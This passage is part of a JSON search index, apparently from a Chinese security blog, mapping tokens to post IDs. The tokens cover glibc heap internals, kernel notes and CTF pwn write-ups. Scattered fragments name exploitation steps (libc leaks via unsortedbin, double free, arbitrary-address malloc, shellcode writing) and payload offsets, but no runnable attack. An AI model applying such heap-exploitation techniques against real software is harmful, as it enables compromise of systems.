\"361\":1,\"464\":1,\"479\":4}}],[\"onenter\",{\"1\":{\"127\":1}}],[\"oncomplete\",{\"1\":{\"125\":1,\"126\":1,\"131\":1}}],[\"oncompete\",{\"1\":{\"125\":1}}],[\"onmatch\",{\"1\":{\"125\":2,\"126\":1,\"131\":1}}],[\"on\",{\"1\":{\"8\":1,\"131\":1,\"150\":1,\"324\":2,\"342\":1,\"347\":2,\"352\":1,\"410\":1}}],[\"用来表示\",{\"1\":{\"451\":1}}],[\"用来在分配的时候加速\",{\"1\":{\"347\":1}}],[\"用结构tcache\",{\"1\":{\"338\":1}}],[\"用户数据协议\",{\"1\":{\"433\":1}}],[\"用户申请内存的时候\",{\"1\":{\"329\":1}}],[\"用户使用malloc函数向堆管理器申请一块内存空间\",{\"1\":{\"328\":1}}],[\"用户顶级检查cq发现请求完成后\",{\"1\":{\"43\":1,\"183\":1}}],[\"用x\",{\"1\":{\"287\":1}}],[\"用vmmap指令查找heap最开始的位置\",{\"1\":{\"287\":1}}],[\"用起来非常自然\",{\"1\":{\"252\":1}}],[\"用rsa加密的信息实际上是不能被解破的\",{\"1\":{\"238\":1}}],[\"用提取数组的方式依次hook这些重载函数\",{\"1\":{\"123\":1}}],[\"用dmesg命令来查看\",{\"1\":{\"74\":1,\"214\":1}}],[\"用栈中数据修改cs\",{\"1\":{\"44\":1,\"184\":1}}],[\"用栈中数据修改ip寄存器\",{\"1\":{\"44\":1,\"184\":1}}],[\"用于合并\",{\"1\":{\"488\":1}}],[\"用于覆写\",{\"1\":{\"488\":1}}],[\"用于定义字段边界\",{\"1\":{\"466\":1}}],[\"用于在文件中加上行号\",{\"1\":{\"464\":1}}],[\"用于查看文件的后几行内容\",{\"1\":{\"464\":1}}],[\"用于查看文件的前几行内容\",{\"1\":{\"464\":1}}],[\"用于分页查看文件内容\",{\"1\":{\"464\":1}}],[\"用于将文件内容输出到终端上\",{\"1\":{\"464\":1}}],[\"用于接收被等待线程的退出状态\",{\"1\":{\"458\":1}}],[\"用于等待指定的线程结束\",{\"1\":{\"458\":1}}],[\"用于说明目的\",{\"1\":{\"449\":1}}],[\"用于large分配还是small\",{\"1\":{\"438\":1}}],[\"用于管理small\",{\"1\":{\"438\":1}}],[\"用于管理上面三种内存的分配\",{\"1\":{\"50\":1,\"190\":1}}],[\"用于指向各种处理函数\",{\"1\":{\"401\":1}}],[\"用于指代被打开的文件\",{\"1\":{\"15\":2,\"157\":2}}],[\"用于记录堆的信息\",{\"1\":{\"353\":1}}],[\"用于标记是否有fastchunk\",{\"1\":{\"347\":1}}],[\"用于标记当前主分配区的状态\",{\"1\":{\"347\":1}}],[\"用于检查\",{\"1\":{\"342\":1}}],[\"用于检查计算prev\",{\"1\":{\"303\":1}}],[\"用于统一的链接检查\",{\"1\":{\"254\":1}}],[\"用于存放\",{\"1\":{\"70\":1,\"210\":1}}],[\"用于替换内存操作\",{\"1\":{\"50\":1,\"190\":1}}],[\"用于取消之前通过\",{\"1\":{\"43\":1,\"183\":1}}],[\"用于注册内核用户共享缓冲区\",{\"1\":{\"43\":1,\"183\":1}}],[\"用于io完成的时候接受信号\",{\"1\":{\"43\":1,\"183\":1}}],[\"用pop\",{\"1\":{\"42\":1,\"182\":1}}],[\"用途\",{\"0\":{\"9\":1,\"151\":1}}],[\"通常有这些设计原则\",{\"1\":{\"252\":1}}],[\"通常特征就是\",{\"1\":{\"252\":1}}],[\"通常view是通过事先在model上注册\",{\"1\":{\"247\":1}}],[\"通常model对数据具备直接访问的权力\",{\"1\":{\"247\":1}}],[\"通常是符号索引\",{\"1\":{\"449\":1}}],[\"通常是修改top\",{\"1\":{\"60\":1,\"200\":1}}],[\"通常是小整数\",{\"1\":{\"15\":2,\"157\":2}}],[\"通讯混乱\",{\"1\":{\"245\":1}}],[\"通过chunk进入tcache然后\",{\"1\":{\"487\":1}}],[\"通过chunk进入unsortedbin中然后输出fd和bk泄露libc地址\",{\"1\":{\"487\":1}}],[\"通过在gdb中输入libc获取libc基础地址来算和io之间的地址偏差\",{\"1\":{\"474\":1}}],[\"通过将ebp覆盖成构造的fake\",{\"1\":{\"445\":1}}],[\"通过两次double\",{\"1\":{\"372\":1,\"494\":1}}],[\"通过向chunk写入内容来劫持信息头chunk\",{\"1\":{\"372\":1,\"494\":1}}],[\"通过write函数直接泄露libc地址\",{\"1\":{\"372\":1,\"494\":1}}],[\"通过malloc\",{\"1\":{\"372\":1,\"494\":1}}],[\"通过fastbin\",{\"1\":{\"335\":1}}],[\"通过unlink将该chunk脱离出来\",{\"1\":{\"324\":1}}],[\"通过unlink脱链\",{\"1\":{\"321\":1}}],[\"通过next\",{\"1\":{\"312\":1}}],[\"通过p的fd获取上一个chunk\",{\"1\":{\"344\":1}}],[\"通过p的fd\",{\"1\":{\"296\":1}}],[\"通过分解n得到p\",{\"1\":{\"243\":1}}],[\"通过上面信息\",{\"1\":{\"144\":1}}],[\"通过触发assert函数中的fflush\",{\"1\":{\"59\":1,\"199\":1}}],[\"通过\",{\"1\":{\"40\":1,\"180\":1}}],[\"通过段选择子去全局描述符\",{\"1\":{\"21\":1,\"163\":1}}],[\"通过idtr寄存器找到idt地址\",{\"1\":{\"21\":1,\"163\":1}}],[\"通过多级页表来实现逻辑地址到地址的映射\",{\"1\":{\"10\":1,\"152\":1}}],[\"其获取逻辑是\",{\"1\":{\"451\":1}}],[\"其他部分还是主要做题遇到再查\",{\"1\":{\"393\":1}}],[\"其次tcache的fd指向的是chunk\",{\"1\":{\"342\":1}}],[\"其次由于板块之间不互相依赖通常导致一些功能的实现复杂化\",{\"1\":{\"246\":1}}],[\"其中\",{\"1\":{\"388\":1,\"464\":1}}],[\"其中num就是我们malloc传的参数\",{\"1\":{\"289\":1}}],[\"其中的notify推送机制\",{\"1\":{\"102\":1}}],[\"其中前16mb是dma区域\",{\"1\":{\"70\":1,\"210\":1}}],[\"其实还有两个readv\",{\"1\":{\"40\":1,\"180\":1}}],[\"其实由于golang都是值传递\",{\"1\":{\"24\":1,\"166\":1}}],[\"其是一个非负整数\",{\"1\":{\"15\":2,\"157\":2}}],[\"其核心思想是\",{\"1\":{\"8\":1,\"150\":1}}],[\"件描述符\",{\"1\":{\"15\":1,\"157\":1}}],[\"多了一个orw的利用\",{\"1\":{\"503\":1}}],[\"多对多\",{\"1\":{\"433\":1}}],[\"多线程分配\",{\"0\":{\"348\":1}}],[\"多线程支持\",{\"1\":{\"346\":1}}],[\"多线程pwn\",{\"0\":{\"346\":1}}],[\"多线程绕过\",{\"0\":{\"38\":1,\"178\":1}}],[\"多个和客户相关的接口要好于一个通用接口\",{\"1\":{\"252\":1}}],[\"多个任务物理意义上的同时运行\",{\"1\":{\"14\":1,\"156\":1}}],[\"多态\",{\"1\":{\"252\":1}}],[\"多级页表\",{\"1\":{\"10\":1,\"152\":1}}],[\"ndouble\",{\"1\":{\"491\":1}}],[\"ndelete\",{\"1\":{\"488\":1}}],[\"n$p来实现指定第几个参数地址写入内容\",{\"1\":{\"476\":1}}],[\"nx\",{\"1\":{\"469\":2}}],[\"nssctf\",{\"0\":{\"524\":1},\"1\":{\"469\":1,\"471\":1}}],[\"nshow一个\",{\"1\":{\"369\":1}}],[\"nl命令\",{\"1\":{\"464\":1}}],[\"nc签到题\",{\"0\":{\"463\":1}}],[\"ncores\",{\"1\":{\"352\":2}}],[\"n删除一个\",{\"1\":{\"369\":1}}],[\"n删除index为\",{\"1\":{\"358\":1,\"359\":1,\"491\":1,\"503\":1}}],[\"n添加index为\",{\"1\":{\"358\":1,\"359\":1,\"491\":1,\"503\":1}}],[\"nprocs\",{\"1\":{\"352\":1}}],[\"nfastbins\",{\"1\":{\"347\":1}}],[\"nbins\",{\"1\":{\"347\":1}}],[\"nb\",{\"1\":{\"305\":4,\"313\":6,\"315\":2,\"320\":1,\"321\":5,\"322\":1,\"352\":1}}],[\"ntustisc\",{\"0\":{\"331\":1,\"341\":1}}],[\"nt\",{\"1\":{\"273\":2}}],[\"nil\",{\"1\":{\"254\":3,\"255\":2}}],[\"nickname+\",{\"1\":{\"125\":1}}],[\"nickname\",{\"1\":{\"125\":4}}],[\"n非常大\",{\"1\":{\"243\":1}}],[\"n顺序丢入\",{\"1\":{\"243\":1}}],[\"n=pq\",{\"1\":{\"241\":1}}],[\"n就可以算出d\",{\"1\":{\"241\":1}}],[\"nadd\",{\"1\":{\"488\":1}}],[\"nadd一个\",{\"1\":{\"369\":1}}],[\"narenas\",{\"1\":{\"352\":15}}],[\"nativesendmessagetojs\",{\"1\":{\"134\":1}}],[\"nativejscall\",{\"1\":{\"134\":1}}],[\"nativepointer\",{\"1\":{\"127\":1}}],[\"name获取我们需要的函数名字在\",{\"1\":{\"451\":1}}],[\"name就是我们需要的函数名了\",{\"1\":{\"451\":1}}],[\"names\",{\"1\":{\"258\":1}}],[\"name=\",{\"1\":{\"127\":1,\"258\":1}}],[\"name\",{\"1\":{\"124\":1,\"125\":5,\"126\":4,\"127\":1,\"131\":6,\"133\":1,\"258\":1,\"261\":2,\"292\":1,\"451\":5,\"455\":1,\"456\":2,\"464\":2,\"473\":6,\"475\":4,\"479\":4,\"480\":7,\"481\":6,\"482\":4,\"483\":5,\"484\":10,\"485\":3,\"486\":4,\"488\":4,\"491\":4,\"503\":4,\"504\":4,\"505\":4}}],[\"name来调用原本的函数\",{\"1\":{\"122\":1}}],[\"nameh\",{\"1\":{\"36\":1,\"176\":1}}],[\"num2\",{\"1\":{\"290\":1}}],[\"num的值为\",{\"1\":{\"281\":1}}],[\"num+=\",{\"1\":{\"281\":2}}],[\"num我们可以通过git\",{\"1\":{\"274\":1}}],[\"numbers\",{\"1\":{\"464\":1}}],[\"numberempire\",{\"1\":{\"243\":1}}],[\"number\",{\"1\":{\"125\":7,\"240\":1,\"347\":1,\"352\":1,\"438\":1,\"469\":1,\"471\":1}}],[\"num\",{\"1\":{\"123\":1,\"274\":1,\"281\":5,\"288\":1,\"289\":1,\"290\":4,\"333\":2,\"438\":1,\"439\":11,\"441\":7,\"442\":5,\"503\":2}}],[\"null漏洞\",{\"1\":{\"294\":1}}],[\"null漏洞进行控制size位的prev\",{\"1\":{\"55\":1,\"195\":1}}],[\"null除外\",{\"1\":{\"84\":1,\"224\":1}}],[\"null\",{\"1\":{\"60\":1,\"73\":1,\"200\":1,\"213\":1,\"286\":1,\"313\":2,\"321\":2,\"324\":3,\"339\":2,\"342\":1,\"344\":2,\"352\":2,\"353\":2,\"403\":4,\"410\":12,\"419\":1,\"439\":1,\"441\":1,\"458\":2}}],[\"nop指令不重要\",{\"1\":{\"482\":1}}],[\"node5\",{\"1\":{\"471\":1}}],[\"noutput\",{\"1\":{\"462\":1}}],[\"noreturn\",{\"1\":{\"460\":1}}],[\"normal\",{\"1\":{\"324\":1,\"347\":1}}],[\"nomask\",{\"1\":{\"312\":2,\"319\":3,\"321\":3,\"324\":3,\"344\":1}}],[\"non\",{\"1\":{\"305\":1,\"313\":1,\"321\":2,\"324\":1,\"390\":2,\"408\":2}}],[\"none\",{\"1\":{\"281\":1}}],[\"nothing\",{\"1\":{\"352\":1}}],[\"note\",{\"1\":{\"270\":1,\"286\":1,\"347\":1,\"475\":3}}],[\"notes\",{\"1\":{\"270\":1}}],[\"not\",{\"1\":{\"258\":2,\"261\":2,\"321\":1,\"324\":6,\"339\":2,\"342\":1,\"344\":1,\"347\":2,\"349\":1,\"352\":2,\"353\":1,\"391\":1,\"428\":1}}],[\"notionnext\",{\"1\":{\"1\":1}}],[\"no\",{\"0\":{\"409\":1},\"1\":{\"73\":1,\"118\":3,\"131\":3,\"213\":1,\"352\":2,\"380\":1,\"403\":2,\"410\":3,\"464\":1,\"469\":2,\"502\":1,\"503\":1}}],[\"nographic\",{\"1\":{\"73\":1,\"213\":1}}],[\"n\",{\"1\":{\"60\":1,\"200\":1,\"240\":19,\"241\":6,\"242\":2,\"243\":4,\"254\":1,\"290\":2,\"347\":1,\"352\":7,\"358\":8,\"359\":8,\"369\":9,\"397\":5,\"449\":1,\"451\":2,\"460\":4,\"461\":37,\"462\":29,\"464\":5,\"470\":2,\"471\":1,\"473\":10,\"475\":10,\"479\":7,\"480\":11,\"481\":6,\"482\":6,\"483\":9,\"484\":6,\"486\":7,\"488\":10,\"491\":9,\"503\":9,\"504\":7,\"505\":6}}],[\"necessary\",{\"1\":{\"428\":1}}],[\"never\",{\"1\":{\"324\":1}}],[\"next链接的是非主分配区\",{\"1\":{\"347\":1}}],[\"nextinuse\",{\"1\":{\"324\":3}}],[\"nextchunk和nextsize\",{\"1\":{\"324\":1}}],[\"nextchunk\",{\"1\":{\"324\":11,\"345\":1}}],[\"nextsize这几个组成\",{\"1\":{\"329\":1}}],[\"nextsize=victim也就是目标地址等于victim\",{\"1\":{\"325\":1}}],[\"nextsize等于目标地址\",{\"1\":{\"325\":1}}],[\"nextsize为目标地址\",{\"1\":{\"325\":1}}],[\"nextsize为null\",{\"1\":{\"324\":1}}],[\"nextsize链接\",{\"1\":{\"308\":1}}],[\"nextsize\",{\"1\":{\"308\":3,\"313\":2,\"319\":16,\"321\":6,\"324\":9,\"325\":17,\"329\":1,\"344\":23}}],[\"next8\",{\"1\":{\"292\":1}}],[\"next12\",{\"1\":{\"292\":1}}],[\"next\",{\"1\":{\"286\":1,\"290\":1,\"296\":1,\"312\":10,\"324\":4,\"339\":1,\"344\":1,\"345\":2,\"347\":6,\"349\":2,\"353\":2,\"358\":3,\"359\":3,\"438\":2}}],[\"needed\",{\"1\":{\"456\":1}}],[\"need\",{\"1\":{\"131\":1,\"270\":1}}],[\"near\",{\"1\":{\"44\":1,\"184\":1}}],[\"newthread\",{\"1\":{\"459\":3}}],[\"newom\",{\"1\":{\"273\":1}}],[\"new\",{\"0\":{\"353\":2},\"1\":{\"37\":1,\"124\":2,\"177\":1,\"348\":1,\"349\":1,\"350\":2,\"352\":2,\"353\":6,\"395\":7,\"403\":13,\"407\":1,\"410\":2,\"411\":2,\"413\":1,\"416\":2,\"417\":2,\"419\":2,\"456\":2}}],[\"netease\",{\"1\":{\"130\":1,\"131\":5,\"133\":1}}],[\"net\",{\"1\":{\"14\":1,\"156\":1,\"244\":1,\"254\":1,\"255\":1,\"483\":1}}],[\"超级通俗易懂\",{\"1\":{\"14\":1,\"156\":1}}],[\"并去掉开头的\",{\"1\":{\"503\":1}}],[\"并回收其资源\",{\"1\":{\"458\":1}}],[\"并将它们加载到内存中\",{\"1\":{\"454\":1}}],[\"并不是所有的chunk都会被放到bins上\",{\"1\":{\"347\":1}}],[\"并不是一个模块只做一个事情\",{\"1\":{\"252\":1}}],[\"并对每个事件添加callback回调函数\",{\"1\":{\"279\":1}}],[\"并重写其觉得需要修改的函数\",{\"1\":{\"252\":1}}],[\"并行是多个cpu同时执行多个任务\",{\"1\":{\"14\":1,\"156\":1}}],[\"并行是指多个处理器或者是多核的处理器同时处理多个不同的任务\",{\"1\":{\"14\":1,\"156\":1}}],[\"并发开启\",{\"1\":{\"460\":1}}],[\"并发\",{\"1\":{\"282\":1}}],[\"并发是一个cpu同时处理多个任务\",{\"1\":{\"14\":1,\"156\":1}}],[\"并发是一个人同时吃三个馒头\",{\"1\":{\"14\":1,\"156\":1}}],[\"并发是逻辑上的同时发生\",{\"1\":{\"14\":1,\"156\":1}}],[\"并发和并行区别秒懂\",{\"1\":{\"14\":1,\"156\":1}}],[\"并发与并行的区别\",{\"1\":{\"14\":1,\"156\":1}}],[\"并发与并行\",{\"0\":{\"14\":1,\"156\":1},\"1\":{\"14\":1,\"156\":1}}],[\"并且多两个chunk\",{\"1\":{\"491\":1}}],[\"并且最重要的是在free的时候没有对chunk指针进行清空\",{\"1\":{\"489\":1}}],[\"并且发现下面这个函数\",{\"1\":{\"460\":1}}],[\"并且接受一个\",{\"1\":{\"458\":1}}],[\"并且映射进入内存\",{\"1\":{\"454\":1}}],[\"并且\",{\"1\":{\"449\":1}}],[\"并且在进行传输的时候比如我发送了一个数据过去\",{\"1\":{\"433\":1}}],[\"并且还因为比赛方平台网络不是特别好\",{\"1\":{\"380\":1,\"502\":1}}],[\"并且还不能破坏到了canary的值\",{\"1\":{\"378\":1,\"500\":1}}],[\"并且还可以实现堆地址的泄露\",{\"1\":{\"57\":1,\"197\":1}}],[\"并且free\",{\"1\":{\"376\":1,\"498\":1}}],[\"并且没有清空\",{\"1\":{\"371\":1,\"493\":1}}],[\"并且没有检测这个index是否在使用\",{\"1\":{\"371\":1,\"493\":1}}],[\"并且仅在创建的时候可以写入数据\",{\"1\":{\"371\":1,\"493\":1}}],[\"并且向原本chunk6\",{\"1\":{\"367\":1}}],[\"并且构造好0x550的prev\",{\"1\":{\"368\":1}}],[\"并且构造好prev\",{\"1\":{\"302\":1,\"368\":1}}],[\"并且构造size\",{\"1\":{\"365\":1}}],[\"并且我们的fd和bk在0x430+16字节的位置\",{\"1\":{\"365\":1,\"369\":1}}],[\"并且我们每多一个用于显示的类\",{\"1\":{\"250\":1}}],[\"并且设置了全局变量main\",{\"1\":{\"353\":1}}],[\"并且设置物理意义上紧挨着的下一个chunk的size中p为0也就是free状态\",{\"1\":{\"315\":1}}],[\"并且进行内存分配\",{\"1\":{\"349\":1}}],[\"并且进行安全检查\",{\"1\":{\"319\":1}}],[\"并且通过消耗空topchunk\",{\"1\":{\"372\":1,\"494\":1}}],[\"并且通过测试发现只要是刚好要malloc的chunk大小如何符合\",{\"1\":{\"358\":1}}],[\"并且通过上面的这个列表\",{\"1\":{\"347\":1}}],[\"并且通知用户空间i请求完成\",{\"1\":{\"43\":1,\"183\":1}}],[\"并且按照功能分了标题\",{\"1\":{\"307\":1}}],[\"并且被清空\",{\"1\":{\"293\":1}}],[\"并且当我调用send的时候\",{\"1\":{\"281\":1}}],[\"并且merge进入了master分支\",{\"1\":{\"275\":1}}],[\"并且分配一个交互终端\",{\"1\":{\"258\":1}}],[\"并且包含一些行为\",{\"1\":{\"252\":1}}],[\"并且调用其函数\",{\"1\":{\"250\":1}}],[\"并且这个属性只能在android应用中有一个\",{\"1\":{\"143\":1}}],[\"并且暂时没有写入磁盘的数据\",{\"1\":{\"68\":1,\"208\":1}}],[\"并且回收一些内存\",{\"1\":{\"68\":1,\"208\":1}}],[\"并且rdx恒为\",{\"1\":{\"59\":1,\"199\":1}}],[\"并且比largebin\",{\"1\":{\"57\":1,\"197\":1}}],[\"并且golang中的参数传递都是值传递\",{\"1\":{\"29\":1,\"171\":1}}],[\"并且存储一个unsafe指针\",{\"1\":{\"26\":1,\"168\":1}}],[\"并且把内存页设置为可读可写状态\",{\"1\":{\"17\":1,\"159\":1}}],[\"并且将内存设置为只读这样写入的时候就会触发缺页保护\",{\"1\":{\"17\":1,\"159\":1}}],[\"并且copy\",{\"1\":{\"16\":1,\"158\":1}}],[\"并且为task分配一个物理内存并复制数据到次内存到中\",{\"1\":{\"9\":1,\"151\":1}}],[\"并且引用计数+1\",{\"1\":{\"4\":1,\"147\":1}}],[\"并且与其相关的资源被释放\",{\"1\":{\"4\":1,\"147\":1}}],[\"就和arahat0师傅文章中的流程一模一样\",{\"1\":{\"503\":1}}],[\"就像是\",{\"1\":{\"451\":1}}],[\"就记录下来\",{\"1\":{\"355\":1}}],[\"就会来top\",{\"1\":{\"347\":1}}],[\"就会根据中断信号\",{\"1\":{\"21\":1,\"163\":1}}],[\"就进入fastbin\",{\"1\":{\"335\":1}}],[\"就作为上一个chunk的一部分来存数据\",{\"1\":{\"329\":1}}],[\"就合并\",{\"1\":{\"324\":1}}],[\"就获取下一个chunk的指针\",{\"1\":{\"324\":1}}],[\"就获取了名字的下标\",{\"1\":{\"36\":1,\"176\":1}}],[\"就直接分割\",{\"1\":{\"313\":1}}],[\"就相当于我们向里面注册会堵塞的事件\",{\"1\":{\"279\":1}}],[\"就不能直接git\",{\"1\":{\"275\":1}}],[\"就不会有副本\",{\"1\":{\"8\":1,\"150\":1}}],[\"就设置一个返回值为true的函数\",{\"1\":{\"254\":1}}],[\"就可以实现malloc下来一个任意地址\",{\"1\":{\"488\":1}}],[\"就可以实现shellcode的写入\",{\"1\":{\"482\":1}}],[\"就可以获取flag\",{\"1\":{\"484\":1}}],[\"就可以成功劫持了\",{\"1\":{\"476\":1}}],[\"就可以利用合并机制\",{\"1\":{\"302\":1}}],[\"就可以求解到x与y\",{\"1\":{\"240\":1}}],[\"就可以触发一个任意写已知地址\",{\"1\":{\"57\":1,\"197\":1}}],[\"就可以通过lr寄存器进行恢复\",{\"1\":{\"47\":1,\"187\":1}}],[\"就申请slot\",{\"1\":{\"50\":1,\"190\":1}}],[\"就去调用对应的处理函数\",{\"1\":{\"20\":1,\"162\":1}}],[\"就是rsp+8\",{\"1\":{\"479\":1}}],[\"就是我们劫持的头chunk\",{\"1\":{\"377\":1,\"499\":1}}],[\"就是利用一次合并机制和分割机制\",{\"1\":{\"368\":1}}],[\"就是新获得unsroted\",{\"1\":{\"358\":1}}],[\"就是经常在设计模块的时候只要不发生依赖循环我们就会在a依赖b依赖c\",{\"1\":{\"245\":1}}],[\"就是设计框架上面的混乱\",{\"1\":{\"245\":1}}],[\"就是指有一个整数d\",{\"1\":{\"240\":1}}],[\"就是算偏移嘛\",{\"1\":{\"127\":1}}],[\"就是在这个类实列化的时候\",{\"1\":{\"124\":1}}],[\"就是同一个函数名字\",{\"1\":{\"123\":1}}],[\"就是内核为了高效管理这些已经被打开的文件所创建的索引\",{\"1\":{\"15\":2,\"157\":2}}],[\"就是管道有一方进行读写操作的时候\",{\"1\":{\"13\":1,\"155\":1}}],[\"0ll\",{\"1\":{\"459\":10,\"460\":1}}],[\"0和tel\",{\"1\":{\"390\":1}}],[\"0的bk\",{\"1\":{\"365\":1}}],[\"0即可\",{\"1\":{\"345\":1}}],[\"06\",{\"1\":{\"311\":2,\"437\":1}}],[\"0038│\",{\"1\":{\"311\":2}}],[\"0030│\",{\"1\":{\"311\":2}}],[\"0028│\",{\"1\":{\"311\":2}}],[\"0020│\",{\"1\":{\"311\":2}}],[\"0018│\",{\"1\":{\"311\":2}}],[\"0010│\",{\"1\":{\"311\":2}}],[\"000\",{\"1\":{\"408\":14}}],[\"0008│\",{\"1\":{\"311\":2}}],[\"00000000004007f4\",{\"1\":{\"470\":1}}],[\"0000│\",{\"1\":{\"311\":2}}],[\"0000以上是内核\",{\"1\":{\"70\":1,\"210\":1}}],[\"0000\",{\"1\":{\"70\":1,\"210\":1}}],[\"00\",{\"1\":{\"311\":2,\"470\":1}}],[\"04pwn环境\",{\"1\":{\"262\":1}}],[\"04安装python3\",{\"1\":{\"262\":1}}],[\"04进行搭建轻量级环境\",{\"1\":{\"262\":1}}],[\"04版本的也就是libc版本为2\",{\"1\":{\"262\":1}}],[\"04\",{\"1\":{\"257\":4,\"258\":3,\"311\":2,\"346\":1}}],[\"07\",{\"1\":{\"255\":1,\"311\":2,\"437\":1}}],[\"01\",{\"1\":{\"49\":2,\"189\":2,\"311\":2}}],[\"0xb6\",{\"1\":{\"484\":2}}],[\"0xbf\",{\"1\":{\"484\":2}}],[\"0xb0\",{\"1\":{\"484\":1}}],[\"0xb9\",{\"1\":{\"484\":2}}],[\"0xbe\",{\"1\":{\"484\":6}}],[\"0xb7\",{\"1\":{\"484\":5}}],[\"0xe3b01+base\",{\"1\":{\"488\":1}}],[\"0xe3b31\",{\"1\":{\"475\":1}}],[\"0xe7\",{\"1\":{\"484\":3}}],[\"0xe6\",{\"1\":{\"484\":3}}],[\"0xe9\",{\"1\":{\"484\":3}}],[\"0xe5\",{\"1\":{\"484\":23}}],[\"0xe8\",{\"1\":{\"484\":14}}],[\"0xe0\",{\"1\":{\"396\":1,\"397\":2}}],[\"0xc7df9b0041348000\",{\"1\":{\"470\":1}}],[\"0xc0\",{\"1\":{\"397\":2}}],[\"0x60\",{\"1\":{\"503\":1}}],[\"0x67616c662f2e\",{\"1\":{\"483\":1}}],[\"0x6c662f2e\",{\"1\":{\"483\":1}}],[\"0x61cc0\",{\"1\":{\"479\":1}}],[\"0x61+i\",{\"1\":{\"475\":2}}],[\"0x61fe1c\",{\"1\":{\"470\":1}}],[\"0x69\",{\"1\":{\"461\":1,\"462\":1}}],[\"0x65\",{\"1\":{\"461\":1,\"462\":1}}],[\"0x66\",{\"1\":{\"461\":1,\"462\":1}}],[\"0x68\",{\"1\":{\"373\":1,\"378\":1,\"380\":8,\"475\":2,\"495\":1,\"500\":1,\"502\":8,\"503\":8}}],[\"0x7\",{\"1\":{\"483\":1}}],[\"0x7620656854006625\",{\"1\":{\"470\":1}}],[\"0x78\",{\"1\":{\"461\":1,\"462\":1,\"488\":3,\"503\":10}}],[\"0x74\",{\"1\":{\"461\":1,\"462\":1}}],[\"0x77\",{\"1\":{\"461\":1,\"462\":1}}],[\"0x7fe867b61160\",{\"1\":{\"503\":1}}],[\"0x7f291e5b6000\",{\"1\":{\"475\":1}}],[\"0x7f291e7a2b70\",{\"1\":{\"475\":1}}],[\"0x7ffff000\",{\"1\":{\"485\":1}}],[\"0x7fffffffdee4\",{\"1\":{\"470\":1}}],[\"0x7ffff7fb5f60\",{\"1\":{\"411\":1}}],[\"0x7ffff7fb9c18\",{\"1\":{\"311\":2}}],[\"0x7ffff7fb9c10\",{\"1\":{\"311\":2}}],[\"0x7ffff7fb9c08\",{\"1\":{\"311\":2}}],[\"0x7ffff7fb9c00\",{\"1\":{\"311\":6}}],[\"0x7ffff7fb9bf8\",{\"1\":{\"311\":2}}],[\"0x7ffff7fb9bf0\",{\"1\":{\"311\":10}}],[\"0x7ffff7fb9be8\",{\"1\":{\"311\":2}}],[\"0x7ffff7fb9be0\",{\"1\":{\"311\":13}}],[\"0x7ffff7a52390\",{\"1\":{\"404\":1}}],[\"0x7f566befac78\",{\"1\":{\"287\":1}}],[\"0xfa\",{\"1\":{\"462\":1}}],[\"0xf0\",{\"1\":{\"388\":1}}],[\"0xffffffffffffffff\",{\"1\":{\"503\":1}}],[\"0xffffffff\",{\"1\":{\"483\":1}}],[\"0xfffffffc\",{\"1\":{\"462\":1}}],[\"0xffffffda\",{\"1\":{\"462\":1}}],[\"0xffffff9b\",{\"1\":{\"462\":1}}],[\"0xffffff95\",{\"1\":{\"462\":1}}],[\"0xffffff9c\",{\"1\":{\"462\":1}}],[\"0xffffff92\",{\"1\":{\"462\":1}}],[\"0xffff\",{\"1\":{\"70\":1,\"210\":1}}],[\"0xd8\",{\"1\":{\"388\":1,\"397\":2}}],[\"0x5600edb1d000\",{\"1\":{\"503\":1}}],[\"0x5600edb1db20\",{\"1\":{\"503\":1}}],[\"0x5633731e9da0\",{\"1\":{\"503\":1}}],[\"0x5\",{\"1\":{\"483\":1}}],[\"0x500\",{\"1\":{\"491\":1}}],[\"0x50a47+baselibc\",{\"1\":{\"481\":1}}],[\"0x50d70\",{\"1\":{\"473\":1}}],[\"0x58\",{\"1\":{\"377\":1,\"499\":1,\"503\":3}}],[\"0x556f2107b000\",{\"1\":{\"503\":1}}],[\"0x556f210bd050\",{\"1\":{\"503\":1}}],[\"0x555555556004\",{\"1\":{\"470\":1}}],[\"0x5555555551c7\",{\"1\":{\"470\":1}}],[\"0x55555555983\",{\"1\":{\"311\":1}}],[\"0x555555559830\",{\"1\":{\"311\":6}}],[\"0x555555559710\",{\"1\":{\"311\":1}}],[\"0x5555555597a0\",{\"1\":{\"311\":1}}],[\"0x555555559680\",{\"1\":{\"311\":9}}],[\"0x550偏移位置坐标在哪里\",{\"1\":{\"368\":1}}],[\"0x550\",{\"1\":{\"368\":1,\"369\":1}}],[\"0x551\",{\"1\":{\"365\":1,\"369\":1}}],[\"0x55e22cd98000+0x10\",{\"1\":{\"287\":1}}],[\"0x38\",{\"1\":{\"491\":1,\"503\":3}}],[\"0x38+p64\",{\"1\":{\"479\":1}}],[\"0x3a\",{\"1\":{\"484\":5}}],[\"0x3\",{\"1\":{\"483\":1}}],[\"0x31\",{\"1\":{\"380\":1,\"491\":1,\"502\":1}}],[\"0x30\",{\"1\":{\"376\":1,\"471\":1,\"498\":1,\"503\":2}}],[\"0x3b0\",{\"1\":{\"367\":1,\"369\":1,\"503\":1}}],[\"0x33\",{\"1\":{\"44\":1,\"184\":1}}],[\"0x33就是64位运行模式\",{\"1\":{\"42\":1,\"182\":1}}],[\"0x4c8000\",{\"1\":{\"504\":1}}],[\"0x4482c0\",{\"1\":{\"504\":1}}],[\"0x447580\",{\"1\":{\"504\":1}}],[\"0x44+p32\",{\"1\":{\"485\":1}}],[\"0x451322\",{\"1\":{\"504\":1}}],[\"0x450\",{\"1\":{\"365\":1,\"369\":1}}],[\"0x493460\",{\"1\":{\"485\":1}}],[\"0x493400\",{\"1\":{\"485\":1}}],[\"0x4\",{\"1\":{\"483\":1}}],[\"0x41348000\",{\"1\":{\"471\":1}}],[\"0x410\",{\"1\":{\"365\":3,\"366\":2,\"369\":5}}],[\"0x409f8e\",{\"1\":{\"504\":1}}],[\"0x40\",{\"1\":{\"503\":2}}],[\"0x40+p32\",{\"1\":{\"485\":1,\"486\":2}}],[\"0x404060+0x100\",{\"1\":{\"505\":1}}],[\"0x404070\",{\"1\":{\"475\":1}}],[\"0x404020+0x100\",{\"1\":{\"473\":1}}],[\"0x404020+0x200\",{\"1\":{\"473\":1}}],[\"0x401f1f\",{\"1\":{\"504\":1}}],[\"0x40133a\",{\"1\":{\"480\":1}}],[\"0x401321\",{\"1\":{\"480\":1}}],[\"0x401050\",{\"1\":{\"475\":1}}],[\"0x40101a\",{\"1\":{\"473\":1,\"504\":1,\"505\":1}}],[\"0x40129d\",{\"1\":{\"505\":1}}],[\"0x401296\",{\"1\":{\"505\":1}}],[\"0x40122d\",{\"1\":{\"473\":1}}],[\"0x401202\",{\"1\":{\"473\":1}}],[\"0x4012cb\",{\"1\":{\"473\":1}